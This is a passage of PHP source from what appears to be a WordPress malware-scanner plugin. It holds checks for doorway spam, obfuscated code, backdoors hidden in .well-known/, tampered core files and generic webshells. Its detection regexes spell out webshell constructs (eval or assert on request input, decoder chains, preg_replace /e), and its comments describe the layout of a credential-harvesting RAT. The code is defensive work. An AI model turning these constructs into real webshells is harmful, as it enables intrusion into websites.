						'action'   => 'This file serves different content to search engines than to ordinary visitors: it '
							. implode( ', and ', $signals ) . '. That is the defining shape of doorway spam - the site owner '
							. 'sees the normal site while crawlers are fed spam pages, so the damage appears in search results '
							. 'rather than on screen.' . $escaped
							. ' Check Search Console for indexed pages you did not create, and compare this file against a clean '
							. 'copy before deleting it, since a legitimate index.php lives at the site root.',
					];
				}
			} catch ( \Throwable $t ) {
				continue;
			}
		}

		return $found;
	}

	/**
	 * 1.4.25: control-flow flattening, measured by goto density.
	 *
	 * Obfuscators scatter labels and jumps so that reading a file top to
	 * bottom tells you nothing. PHP has goto and real code essentially never
	 * uses it - across the 79 PHP files of a production theme and this plugin,
	 * the measured density is zero. The recovered samples ran at 16 and 18
	 * statements per kilobyte.
	 *
	 * Unlike a string, this cannot be escaped or renamed away without the file
	 * ceasing to work, which makes it durable against re-obfuscation.
	 */
	private static function check_control_flow_flattening(): array {
		$found = [];
		if ( ! class_exists( 'WPS_Utils' ) ) {
			return $found;
		}
		$self_dir = realpath( WPS_DIR ) ?: '';

		$roots = [ rtrim( ABSPATH, '/\\' ) ];
		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
		}

		$count = 0;
		$seen  = [];
		foreach ( $roots as $root ) {
			if ( ! is_dir( $root ) ) {
				continue;
			}
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				$iter->setMaxDepth( 5 );
				foreach ( $iter as $f ) {
					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
						break 2;
					}
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
						continue;
					}
					if ( ! self::is_php_executable( $f ) ) {
						continue;
					}
					$path = $f->getPathname();
					$real = realpath( $path ) ?: $path;
					if ( isset( $seen[ $real ] ) ) {
						continue;
					}
					$seen[ $real ] = true;
					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
						continue;
					}
					$size = $f->getSize();
					if ( $size < 500 || $size > 1048576 ) {
						continue;
					}
					$c = @file_get_contents( $path );
					if ( false === $c ) {
						continue;
					}
					$d = WPS_Utils::goto_density( $c );

					// Both a floor and a rate: a handful of gotos in a very
					// large generated file is not the same thing.
					if ( $d['count'] < 20 || $d['per_kb'] < 5 ) {
						continue;
					}

					$found[] = [
						'severity' => 'critical',
						'type'     => 'Control-flow-flattened PHP (obfuscation)',
						'subject'  => self::display_path( $path ) . ' [' . $d['count'] . ' goto, ' . $d['per_kb'] . '/KB]',
						'path'     => $path,
						'action'   => 'This file contains ' . $d['count'] . ' goto statements at ' . $d['per_kb']
							. ' per kilobyte. PHP supports goto but working code essentially never uses it, and never at this '
							. 'density - the purpose is to make the file unreadable by scattering its logic behind jumps. '
							. 'Treat this as obfuscated code and identify what it does before deciding, but no legitimate '
							. 'plugin or theme ships PHP in this shape.',
					];
				}
			} catch ( \Throwable $t ) {
				continue;
			}
		}

		return $found;
	}

	private static function check_well_known_php(): array {
		$found = [];
		$base = rtrim( ABSPATH, '/\\' ) . '/.well-known';
		if ( ! is_dir( $base ) ) return $found;

		// Confirmed-bad content markers. Any PHP file under .well-known/
		// containing one of these is the RAT family and gets auto-deleted.
		// We use the same constant set the scanner uses elsewhere for
		// consistency  RAT signatures move forward together.
		$rat_markers = self::SIGNATURES_BACKDOOR;

		$count = 0;
		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $base, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			$iter->setMaxDepth( self::WELL_KNOWN_MAX_DEPTH );

			foreach ( $iter as $f ) {
				if ( ++$count > self::WELL_KNOWN_MAX_FILES ) break;
				if ( ! ( $f instanceof SplFileInfo ) ) continue;
				if ( ! $f->isFile() ) continue;
				if ( ! self::is_php_executable( $f ) ) continue;

				$path     = $f->getPathname();
				$basename = $f->getFilename();
				$relpath  = '.well-known' . substr( $path, strlen( $base ) );

				$matched_marker = null;
				if ( $f->getSize() > 0 && $f->getSize() < 524288 ) { // 512 KiB cap on read
					$contents = @file_get_contents( $path );
					if ( $contents !== false ) {
						foreach ( $rat_markers as $marker ) {
							if ( strpos( $contents, $marker ) !== false ) {
								$matched_marker = $marker;
								break;
							}
						}
					}
				}

				if ( $matched_marker !== null ) {
					$victim_site = self::extract_rat_victim_site( $contents ?? '' );
					$victim_note = $victim_site !== ''
						? ' This build is a polymorphic variant customised against the victim site ' . $victim_site . '.'
						: '';
					$found[] = [
						'severity'    => 'critical',
						'type'        => 'RAT under .well-known/ (signature ' . substr( $matched_marker, 0, 16 ) . ')',
						'subject'     => $relpath . ( $victim_site !== '' ? ' [victim_site=' . $victim_site . ']' : '' ),
						'path'        => $path,
						'action'      => 'Confirmed RAT family backdoor hidden in the .well-known/ directory. The IETF .well-known/ '
							. 'protocols use static text files; PHP execution there is not legitimate. The matching signature is the '
							. 'wp-locale-handler RAT family. Auto-delete is safe.' . $victim_note,
						'auto_delete' => true,
						'delete_path' => $path,
					];
				} else {
					// Unsigned PHP under .well-known/. Rare-but-possible
					// false-positive case: hosting-panel-managed PHP for
					// ACME challenges. Flag for review; do not auto-delete.
					$found[] = [
						'severity' => 'high',
						'type'     => 'PHP file under .well-known/ (no IETF protocol uses PHP here)',
						'subject'  => $relpath,
						'path'     => $path,
						'action'   => 'No standard .well-known/ URI uses PHP execution; ACME challenges, PKI validation, security.txt, '
							. 'and host-meta all use static content. Inspect this file manually before deleting; the rare legitimate '
							. 'case is hosting-panel-managed PHP for ACME (some Plesk setups). If unfamiliar, treat as a backdoor in '
							. 'a clever hiding place. Filename: ' . $basename,
					];
				}
			}
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'check_well_known_php walker error: ' . $e->getMessage() );
		}

		return $found;
	}

	/**
	 * Extract the victim-site domain from a captured RAT sample.
	 *
	 * Every cert-check.php / wp-locale-handler.php variant embeds a
	 * credential-harvester payload as a base64 blob inside
	 * `$inj=base64_decode('...')`. The decoded form contains a fixed HMAC
	 * seed concatenated with the victim-site domain in this exact shape:
	 *
	 *   $_xk=md5('a3f8b2c1...c3d4e'.'<DOMAIN>')
	 *
	 * The HMAC seed is constant across the family; the domain after the
	 * concatenation is the only variable. Extracting it tells the
	 * scanner which site the build was customised AGAINST  i.e., which
	 * victim's data the operator chain prepared this build to harvest.
	 *
	 * NOTE ON NAMING: the previous name of this method was
	 * `extract_rat_operator_target()` (1.3.45 - 1.3.55). The ambiguous
	 * "operator target" wording was renamed to "victim site" in 1.3.56
	 * because the term could be misread as "domain owned by the
	 * operator" when in fact the extracted value is always the victim
	 * site whose installation has been compromised. A backward-compat
	 * alias (`extract_rat_operator_target()`) is retained.
	 *
	 * Returns the domain string on success, or an empty string if the
	 * pattern is not found.
	 *
	 * @param string $contents Raw file bytes of the suspected RAT.
	 */
	private static function extract_rat_victim_site( string $contents ): string {
		if ( $contents === '' ) return '';

		// Find every base64 blob inside a base64_decode('...') call. Don't
		// assume only one  the RAT has at least two (mode-l, mode-t) and
		// future versions may add more. Cap iterations defensively.
		if ( ! preg_match_all( "/base64_decode\\(\\s*['\"]([A-Za-z0-9+\\/=]{200,})['\"]\\s*\\)/", $contents, $m ) ) {
			return '';
		}

		$hmac_seed_marker = 'a3f8b2c1d4e5f6071829304a5b6c7d8e9f0a1b2c3d4e5f607182930a1b2c3d4e';

		foreach ( array_slice( $m[1], 0, 10 ) as $blob ) {
			$decoded = @base64_decode( $blob, true );
			if ( $decoded === false || strpos( $decoded, $hmac_seed_marker ) === false ) continue;

			// Match the literal sequence `'<HMAC_SEED>'.'<DOMAIN>'`
			// in the decoded payload. Captures the domain.
			$pattern = "/'" . $hmac_seed_marker . "'\\s*\\.\\s*'([^']{3,253})'/";
			if ( preg_match( $pattern, $decoded, $dm ) ) {
				$candidate = strtolower( trim( $dm[1] ) );
				// Sanity-check: must look domain-shaped to prevent garbage
				// from a malformed payload landing in the alert email.
				if ( preg_match( '/^[a-z0-9.-]{3,253}\\.[a-z]{2,63}$/', $candidate ) ) {
					return $candidate;
				}
			}
		}

		return '';
	}

	/**
	 * Backward-compatibility alias. Earlier releases (1.3.45-1.3.55) used
	 * the misleading name `extract_rat_operator_target()` for this method.
	 * Retained as a private alias so any internal callers that still use
	 * the old name continue to work; new code should use
	 * `extract_rat_victim_site()`.
	 *
	 * @deprecated 1.3.56 Use extract_rat_victim_site() instead.
	 */
	private static function extract_rat_operator_target( string $contents ): string {
		return self::extract_rat_victim_site( $contents );
	}

	//  Generic webshell pattern detection (1.3.46) 
	//
	// Family-specific signature lists (the wp-perf-analytics ClickFix family,
	// the .sbs cookie-exfil toolkit, the wp-locale-handler RAT, etc.) catch
	// known threats. Every release of this conversation has shown how often
	// new variants surface that are not yet in any IoC list. Generic webshell
	// patterns close that gap by matching the structural shapes that are
	// essentially always malicious in 2026, regardless of family.
	//
	// Calibration matters here. Generic patterns can false-positive on
	// legitimate plugins (some commercial plugins do `eval(base64_decode(...))`
	// for licence-key obfuscation, however poor that practice). The patterns
	// in this check are deliberately narrow:
	//
	//   1. assert($_POST/_GET/...)               always a shell, no exception
	//   2. eval($_POST/_GET/...)                 always a shell, no exception
	//   3. eval(base64_decode($_POST/_GET/...))  always a shell, no exception
	//   4. preg_replace('/.../e', $_POST...)     always a shell (PHP <7 RCE)
	//   5. (include|require)($_POST/_GET/...)    always RFI (remote file inclusion)
	//
	// Each pattern requires a USER-INPUT SUPERGLOBAL inside the dangerous
	// construct. Static-string variants (e.g. eval(base64_decode('xxxx')))
	// are not matched here because they have rare-but-real benign uses. The
	// signed RAT family signatures already cover the malicious cases of
	// static-string base64+eval that we have observed.

	const WEBSHELL_MAX_FILES   = 8000;
	const WEBSHELL_MAX_DEPTH   = 8;
	const WEBSHELL_MAX_FILE_BYTES = 524288; // 512 KiB read cap

	/**
	 * Walk ABSPATH and wp-content/ for files containing high-confidence
	 * webshell patterns. Returns scanner-shape findings, all at `critical`
	 * with `auto_delete: true` because every pattern requires a user-input
	 * superglobal inside an eval/assert/include construct  not a shape
	 * legitimate code produces.
	 *
	 * Excluded paths: wp-includes/, wp-admin/ (covered separately and
	 * legit core), the plugin's own directory, and active-theme directory
	 * (covered by check_theme_for_backdoor).
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_generic_webshell_patterns(): array {
		$found = [];
		$abspath_real = realpath( ABSPATH ) ?: rtrim( ABSPATH, '/\\' );
		$self_dir = realpath( WPS_DIR ) ?: '';

		// Patterns: regex => {label, severity}
		// Every pattern requires a user-input superglobal (\$_POST/_GET/_REQUEST/_COOKIE/_SERVER)
		// inside an eval/assert/include construct. This is the structural
		// signature of a webshell and has no legitimate use case.
		$patterns = [
			'/assert\s*\(\s*\$_(POST|GET|REQUEST|COOKIE|SERVER)/i'
				=> [ 'label' => 'assert(\$_USERINPUT) webshell', 'severity' => 'critical' ],
			'/eval\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)/i'
				=> [ 'label' => 'eval(\$_USERINPUT) webshell', 'severity' => 'critical' ],
			'/eval\s*\(\s*(?:base64_decode|gzinflate|str_rot13|gzuncompress|hex2bin|pack)\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)/i'
				=> [ 'label' => 'eval(decoder(\$_USERINPUT)) webshell', 'severity' => 'critical' ],
			'/(include|require)(_once)?\s*\(?\s*\$_(POST|GET|REQUEST|COOKIE)/i'
				=> [ 'label' => 'remote file inclusion via \$_USERINPUT', 'severity' => 'critical' ],
			'/preg_replace\s*\(\s*[\'"]\/(?:[^\'"]|\\\\.)*\/[a-z]*e[a-z]*[\'"]/i'
				=> [ 'label' => 'preg_replace /e modifier (PHP <7 RCE shell)', 'severity' => 'critical' ],
		];

		// Walk only ABSPATH. With maxDepth 8 plus the iterator's recursion,
		// this covers wp-content/ in full while visiting each file exactly
		// once. Walking BOTH ABSPATH and wp-content/ separately would double-
		// visit every file in wp-content/, which is what an earlier draft did.
		// wp-includes/ and wp-admin/ are excluded by string-prefix check
		// because they are pure WP core; the plugin's self-dir is excluded
		// because its own indicator strings would self-match.

		$count = 0;
		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $abspath_real, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			$iter->setMaxDepth( self::WEBSHELL_MAX_DEPTH );

			foreach ( $iter as $f ) {
				if ( ++$count > self::WEBSHELL_MAX_FILES ) break;
				if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) continue;
				if ( ! self::is_php_executable( $f ) ) continue;
				if ( $f->getSize() > self::WEBSHELL_MAX_FILE_BYTES ) continue;
				if ( $f->getSize() === 0 ) continue;

				$path = $f->getPathname();
				$real = realpath( $path );
				if ( ! $real ) continue;

				// Path exclusions: WP core, plugin self-dir
				if ( strpos( $real, $abspath_real . DIRECTORY_SEPARATOR . 'wp-includes' ) === 0 ) continue;
				if ( strpos( $real, $abspath_real . DIRECTORY_SEPARATOR . 'wp-admin' ) === 0 ) continue;
				if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) continue;
				if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue; // 1.3.94: never re-scan the store

				$contents = @file_get_contents( $path );
				if ( $contents === false || $contents === '' ) continue;

				foreach ( $patterns as $regex => $meta ) {
					if ( ! preg_match( $regex, $contents, $pm ) ) continue;
					// Excerpt around the match for the finding's preview field
					$pos = strpos( $contents, $pm[0] );
					$excerpt = substr( $contents, max( 0, $pos - 40 ), 120 );
					$excerpt = preg_replace( '/\s+/', ' ', $excerpt );

					$found[] = [
						'severity'    => $meta['severity'],
						'type'        => 'Generic webshell pattern: ' . $meta['label'],
						'subject'     => str_replace( $abspath_real, '', $real ),
						'path'        => $path,
						'action'      => 'High-confidence webshell pattern detected. Every variant of this regex requires a user-input superglobal inside an eval/assert/include construct, which has no legitimate use. Auto-delete is safe.',
						'preview'     => $excerpt,
						'auto_delete' => true,
						'delete_path' => $path,
					];
					break; // first match per file is enough
				}
			}
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'check_generic_webshell_patterns walker error: ' . $e->getMessage() );
		}

		return $found;
	}

	//  xmlrpc.php integrity check (1.3.46) 
	//
	// A common attacker TTP is replacing xmlrpc.php with a webshell that
	// mimics the WordPress structure to evade signature scanning. The real
	// xmlrpc.php is roughly 3 KiB, defines XMLRPC_REQUEST, requires
	// class-IXR.php, requires class-wp-xmlrpc-server.php, and instantiates
	// $wp_xmlrpc_server. A replacement that omits any of those structural
	// markers is suspicious regardless of how it presents on the wire.
	//
	// The check does not auto-delete because xmlrpc.php is a core file;
	// removing it would surface as a 404 on legitimate XML-RPC traffic,
	// which is more noticeable than the operator might want during an
	// active investigation. Recommendation is to restore from WP core.

	/**
	 * Verify xmlrpc.php contains the canonical WordPress structure.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_xmlrpc_integrity(): array {
		$found = [];
		$path = rtrim( ABSPATH, '/\\' ) . '/xmlrpc.php';
		if ( ! is_file( $path ) ) return $found;

		// Sanity-bound the read. Real xmlrpc.php is ~3.2 KiB; anything
		// over 50 KiB is itself a strong signal even before we look at
		// content.
		$size = @filesize( $path );
		if ( $size === false ) return $found;

		$contents = @file_get_contents( $path, false, null, 0, 60000 );
		if ( $contents === false ) return $found;

		// Required structural markers in the canonical core file
		$required = [
			'XMLRPC_REQUEST'             => 'XMLRPC_REQUEST define',
			'class-IXR.php'              => 'class-IXR.php require',
			'class-wp-xmlrpc-server.php' => 'class-wp-xmlrpc-server.php require',
		];

		$missing = [];
		foreach ( $required as $marker => $label ) {
			if ( strpos( $contents, $marker ) === false ) $missing[] = $label;
		}

		// Two failure modes:
		//   (a) markers missing  almost certainly a replacement
		//   (b) file is suspiciously large  injection or wholesale replacement

		if ( ! empty( $missing ) ) {
			$found[] = [
				'severity' => 'critical',
				'type'     => 'xmlrpc.php replaced (missing canonical structure)',
				'subject'  => 'xmlrpc.php size=' . $size . ' bytes',
				'path'     => $path,
				'action'   => 'xmlrpc.php is missing required WordPress core markers: ' . implode( ', ', $missing ) . '. '
					. 'This usually means the file has been replaced with a webshell. Restore from a clean WordPress core download (https://wordpress.org/download/) or via WP-CLI: `wp core download --force`. '
					. 'Do not auto-delete  this is a core file and must be restored, not removed.',
				'preview'  => substr( $contents, 0, 200 ),
			];
			return $found; // missing-structure finding takes precedence
		}

		if ( $size > 10240 ) { // 10 KiB
			$found[] = [
				'severity' => 'high',
				'type'     => 'xmlrpc.php larger than expected (possible injection)',
				'subject'  => 'xmlrpc.php size=' . $size . ' bytes (canonical is ~3.2 KiB)',
				'path'     => $path,
				'action'   => 'xmlrpc.php contains all canonical markers but is significantly larger than the WP core file (~3.2 KiB). '
					. 'This may indicate code injected before/after the canonical content, or a backdoor that preserves the structural markers as cover. '
					. 'Compare against a clean WP core download. Restore via WP-CLI if injection confirmed: `wp core download --force`.',
			];
		}

		return $found;
	}

	//  WordPress core checksum verification (1.3.47) 
	//
	// WordPress.org publishes SHA-1 checksums for every core file per
	// version at api.wordpress.org/core/checksums/1.0/. WP-CLI's
	// `wp core verify-checksums` command uses this endpoint. Comparing
	// on-disk SHA-1 against the published manifest catches any modification
	// to wp-includes/, wp-admin/, or ABSPATH-root core files regardless of
	// whether the change matches any signature  this is the universal
	// core integrity check.
	//
	// The check fetches the manifest at most once per 24 hours (cached in
	// a transient), so the network cost on the hourly scan is bounded.
	// Network failure is non-fatal: if the manifest cannot be fetched, the
	// check skips silently. The signature-based and pattern-based checks
	// continue to run independently.
	//
	// Files outside the manifest are ignored: wp-content/ varies per site
	// and is covered by other checks. wp-config.php is not in the manifest
	// (it is a generated file, never matches), and its integrity is covered
	// by the existing check_wp_config_integrity().

	const CORE_CHECKSUMS_TRANSIENT = 'wps_core_checksums';
	const CORE_CHECKSUMS_TTL       = 86400; // 24 hours
	const CORE_CHECKSUMS_API       = 'https://api.wordpress.org/core/checksums/1.0/';
	const CORE_CHECKSUMS_TIMEOUT   = 8;     // seconds
	const CORE_CHECKSUMS_MAX_FINDINGS = 50; // cap per scan to avoid email-flood on a fully-corrupted install

	private static function core_checksums_cache_key( string $version, string $locale ): string {
		return self::CORE_CHECKSUMS_TRANSIENT . '_' . md5( $version . '|' . $locale );
	}

	/**
	 * Fetch the core checksum manifest for the running WordPress version
	 * from api.wordpress.org. Cached for 24 hours. Returns an associative
	 * array of relative-path => sha1, or empty array on any failure.
	 *
	 * The manifest format from WordPress.org is:
	 *   { "checksums": { "wp-includes/foo.php": "<sha1>", ... } }
	 * Per-file paths are relative to ABSPATH and use forward slashes.
	 *
	 * @return array<string, string>
	 */
	private static function fetch_core_checksums(): array {
		// Read WP version from globals first (the active WP runtime), fall
		// back to wp-includes/version.php parsing if the global isn't set
		// (which would happen if the scanner runs before WP is fully loaded).
		global $wp_version, $wp_local_package;
		$version = is_string( $wp_version ?? null ) ? $wp_version : '';
		if ( $version === '' ) {
			$vpath = rtrim( ABSPATH, '/\\' ) . '/wp-includes/version.php';
			if ( is_file( $vpath ) ) {
				$vsrc = @file_get_contents( $vpath, false, null, 0, 4096 );
				if ( $vsrc && preg_match( "/\\\$wp_version\\s*=\\s*'([^']+)'/", $vsrc, $vm ) ) {
					$version = $vm[1];
				}
			}
		}
		if ( $version === '' || ! preg_match( '/^\d+\.\d+(\.\d+)?$/', $version ) ) {
			return [];
		}

		$locale = is_string( $wp_local_package ?? null ) && $wp_local_package !== '' ? $wp_local_package : 'en_US';
		$cache_key = self::core_checksums_cache_key( $version, $locale );
		$cached = get_transient( $cache_key );
		if ( is_array( $cached ) ) return $cached;

		$url = self::CORE_CHECKSUMS_API . '?version=' . rawurlencode( $version ) . '&locale=' . rawurlencode( $locale );

		// Use WordPress's own HTTP API (handles HTTPS, proxies, timeouts uniformly).
		if ( ! function_exists( 'wp_safe_remote_get' ) ) {
			set_transient( $cache_key, [], 3600 );
			return [];
		}
		$resp = wp_safe_remote_get( $url, [
			'timeout'    => self::CORE_CHECKSUMS_TIMEOUT,
			'user-agent' => 'WP-Perf-Shield/' . ( defined( 'WPS_VERSION' ) ? WPS_VERSION : '0' ) . '; ' . home_url(),
		] );
		if ( is_wp_error( $resp ) ) {
			WPS_Logger::write( 'core checksum fetch failed: ' . $resp->get_error_message() );
			set_transient( $cache_key, [], 3600 );
			return [];
		}
		$body = wp_remote_retrieve_body( $resp );
		$code = (int) wp_remote_retrieve_response_code( $resp );
		if ( $code !== 200 || ! is_string( $body ) || $body === '' ) {
			WPS_Logger::write( 'core checksum fetch HTTP ' . $code );
			set_transient( $cache_key, [], 3600 );
			return [];
		}

		$data = json_decode( $body, true );
		$manifest = ( is_array( $data ) && isset( $data['checksums'] ) && is_array( $data['checksums'] ) ) ? $data['checksums'] : [];
		// Strict shape: relative-path strings -> 40-hex sha1 strings only.
		$clean = [];
		foreach ( $manifest as $rel => $hash ) {
			if ( ! is_string( $rel ) || ! is_string( $hash ) ) continue;
			if ( ! preg_match( '/^[a-f0-9]{40}$/', $hash ) ) continue;
			$rel = ltrim( str_replace( '\\', '/', $rel ), '/' );
			$clean[ $rel ] = $hash;
		}

		set_transient( $cache_key, $clean, self::CORE_CHECKSUMS_TTL );
		return $clean;
	}

	/**
	 * Verify on-disk SHA-1 of every WP core file against the official
	 * wordpress.org manifest. Mismatched files are flagged `critical` with
	 * NO auto-delete (core files must be restored, not removed). Missing
	 * files are flagged `high` review-only. Files outside the manifest
	 * (wp-content/, wp-config.php, language packs) are ignored entirely.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_core_checksums(): array {
		$found = [];
		$manifest = self::fetch_core_checksums();
		if ( empty( $manifest ) ) return $found;

		$abspath_real = realpath( ABSPATH ) ?: rtrim( ABSPATH, '/\\' );
		$mismatches = 0;
		$missing = 0;

		foreach ( $manifest as $rel => $expected_sha1 ) {
			// We only verify wp-admin/, wp-includes/, and ABSPATH-root files.
			// Language packs and a few peripheral files in the manifest may
			// not exist on every install; skipping them is safer than
			// noisy false-positives.
			if ( strpos( $rel, 'wp-admin/' ) !== 0
				&& strpos( $rel, 'wp-includes/' ) !== 0
				&& strpos( $rel, '/' ) !== false ) {
				continue;
			}

			// Stop if we have already found enough findings to email about.
			// A fully-trojanized install would otherwise produce hundreds
			// of findings and choke the rate-limited admin email.
			if ( count( $found ) >= self::CORE_CHECKSUMS_MAX_FINDINGS ) break;

			$path = $abspath_real . DIRECTORY_SEPARATOR . str_replace( '/', DIRECTORY_SEPARATOR, $rel );

			if ( ! is_file( $path ) ) {
				$missing++;
				$found[] = [
					'severity' => 'high',
					'type'     => 'WP core file missing (manifest expects this file)',
					'subject'  => $rel,
					'path'     => $path,
					'action'   => 'WordPress.org checksum manifest lists this file but it is not present on disk. '
						. 'Likely cause: deliberate stripping by an attacker, or a partial WordPress restore. '
						. 'Restore via `wp core download --force` or by reinstalling WordPress core.',
				];
				continue;
			}

			$actual_sha1 = @sha1_file( $path );
			if ( ! $actual_sha1 ) continue;
			if ( hash_equals( $expected_sha1, $actual_sha1 ) ) continue;

			$mismatches++;
			$found[] = [
				'severity' => 'critical',
				'type'     => 'WP core file modified (sha1 mismatch vs api.wordpress.org)',
				'subject'  => $rel,
				'path'     => $path,
				'action'   => 'WordPress.org publishes SHA-1 for every core file per version; this file does not match. '
					. 'Either the file was modified deliberately (which breaks WP self-update), or a backdoor has been injected. '
					. 'Restore from clean WP core: `wp core download --force` or via Updates -> Re-install. '
					. 'Do not auto-delete  this is a core file and must be restored, not removed.',
				'preview'  => 'expected_sha1=' . substr( $expected_sha1, 0, 16 ) . '... actual_sha1=' . substr( $actual_sha1, 0, 16 ) . '...',
			];
		}

		if ( $mismatches > 0 || $missing > 0 ) {
			WPS_Logger::log_event(
				'core_checksum_mismatch',
				'mismatches=' . $mismatches . ' missing=' . $missing . ' findings=' . count( $found )
			);
		}

		return $found;
	}

	//  Extra-files-in-core check (1.3.48) 
	//
	// 1.3.47's check_core_checksums catches MODIFIED and MISSING core files
	// by comparing against the WordPress.org manifest. It does NOT catch
	// ADDED files: a webshell planted at wp-includes/class-wp-cache.php or
	// wp-admin/admin-tools.php sits in a path that is not in the manifest,
	// so the checksum check has no expected hash to compare against and
	// silently lets the file through. The natural complement is to walk
	// wp-admin/ and wp-includes/, hash every PHP file, and flag any file
	// whose relative path is NOT in the manifest.
	//
	// Calibration: only flags PHP files (extra .css/.js/.png in core dirs
	// is unusual but rarely a shell). Severity is `high` rather than
	// `critical` because the operator may have legitimately added a custom
	// PHP file for debugging or hosting integration. Action recommends
	// inspection before deletion. No auto-delete (false-positive risk on
	// legitimate operator additions to a core directory).

	const CORE_EXTRA_MAX_FILES = 5000;

	/**
	 * Walk wp-admin/ and wp-includes/ for PHP files NOT in the published
	 * WordPress.org manifest. Each such file is a candidate planted shell.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_core_extra_files(): array {
		$found = [];
		$manifest = self::fetch_core_checksums();
		if ( empty( $manifest ) ) return $found;

		$abspath_real = realpath( ABSPATH ) ?: rtrim( ABSPATH, '/\\' );
		// Normalize manifest keys for fast O(1) lookup
		$manifest_keys = array_fill_keys( array_keys( $manifest ), true );

		$count = 0;
		foreach ( [ 'wp-admin', 'wp-includes' ] as $subdir ) {
			$root = $abspath_real . DIRECTORY_SEPARATOR . $subdir;
			if ( ! is_dir( $root ) ) continue;

			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);

				foreach ( $iter as $f ) {
					if ( ++$count > self::CORE_EXTRA_MAX_FILES ) break 2;
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) continue;
					if ( ! self::is_php_executable( $f ) ) continue;

					$path = $f->getPathname();
					// Compute the relative path the manifest uses (forward slashes,
					// relative to ABSPATH).
					$rel = ltrim( str_replace( '\\', '/', substr( $path, strlen( $abspath_real ) ) ), '/' );

					if ( isset( $manifest_keys[ $rel ] ) ) continue; // legitimate core file

					// Extra PHP file in a core directory  not in the manifest.
					$found[] = [
						'severity'    => 'high',
						'type'        => 'PHP file in core directory not in api.wordpress.org manifest',
						'subject'     => $rel,
						'path'        => $path,
						'action'      => 'A PHP file exists in ' . $subdir . '/ that is not part of the official WordPress core file set for this version. '
							. 'This is a strong indicator of a planted shell, but the operator may have legitimately added a custom file (debugging, hosting integration). '
							. 'Inspect the file contents before deleting. If the file is unfamiliar or contains code not consistent with WP core conventions, treat as a backdoor.',
					];
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'check_core_extra_files walker error: ' . $e->getMessage() );
			}
		}

		// 1.3.51: also walk ABSPATH root non-recursively. The canonical WP root
		// has a small fixed PHP file set; any other PHP file at root is either
		// a planted shell (e.g., the wp-clean-perf.php cleanup-tool pattern,
		// or a custom-named webshell) or operator-added (debugging, hosting
		// integration). Severity is `medium` rather than `high` because the
		// false-positive rate at root is higher  hosting providers like
		// Plesk drop their own diagnostic PHPs at root, which are benign but
		// unfamiliar. The action text explicitly accommodates this. No
		// auto_delete: at root, the operator decides.
		$canonical_root_php = self::canonical_root_php_files();
		$known_safe_extras  = self::known_safe_root_php_extras();
		try {
			$root_iter = new FilesystemIterator( $abspath_real, FilesystemIterator::SKIP_DOTS );
			foreach ( $root_iter as $f ) {
				if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) continue;
				if ( ! self::is_php_executable( $f ) ) continue;
				$basename = strtolower( $f->getFilename() );
				if ( isset( $canonical_root_php[ $basename ] ) ) continue;
				if ( isset( $known_safe_extras[ $basename ] ) ) continue;

				$found[] = [
					'severity'    => 'medium',
					'type'        => 'PHP file at WordPress root not in canonical core file set',
					'subject'     => $f->getFilename() . ' at ABSPATH',
					'path'        => $f->getPathname(),
					'action'      => 'A PHP file exists at WordPress root that is not part of the canonical WP core file set (the ~16 wp-*.php files plus index.php / xmlrpc.php / license.txt) and is not a recognised hosting-tool addition (wp-config.php, wordfence-waf.php, etc.). '
						. 'Common benign causes: hosting-provider diagnostic scripts (Plesk, cPanel, ManageWP), one-shot operator cleanup tools (e.g., the wp-clean-perf.php pattern), or a manually-installed dev tool (adminer.php, phpinfo.php). '
						. 'Common malicious causes: planted webshells with custom names, fake "cleanup" tools that install backdoors instead of removing them, or staged dropper artefacts. '
						. 'Inspect the file contents. If it is operator-known, either delete it after use (one-shot tools should not persist on disk) or add the basename to a project-internal allowlist. If unfamiliar, treat as a backdoor and delete.',
				];
			}
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'check_core_extra_files (root walker) error: ' . $e->getMessage() );
		}

		return $found;
	}

	/**
	 * The canonical WordPress root-level PHP file set. Hard-coded because the
	 * wordpress.org checksums manifest covers every file at root individually
	 * and we want this to work even when fetch_core_checksums() returns empty
	 * (e.g., during sandbox testing or when the network call is failing).
	 *
	 * @return array<string, true>
	 */
	private static function canonical_root_php_files(): array {
		// Lowercase basenames; checked case-insensitively.
		return array_fill_keys( [
			'index.php',
			'wp-activate.php',
			'wp-blog-header.php',
			'wp-comments-post.php',
			'wp-config-sample.php',
			'wp-cron.php',
			'wp-links-opml.php',
			'wp-load.php',
			'wp-login.php',
			'wp-mail.php',
			'wp-settings.php',
			'wp-signup.php',
			'wp-trackback.php',
			'xmlrpc.php',
		], true );
	}

	/**
	 * PHP files that are not part of the WordPress core manifest but have a
	 * universally-known benign reason to exist at ABSPATH root. Adding to this
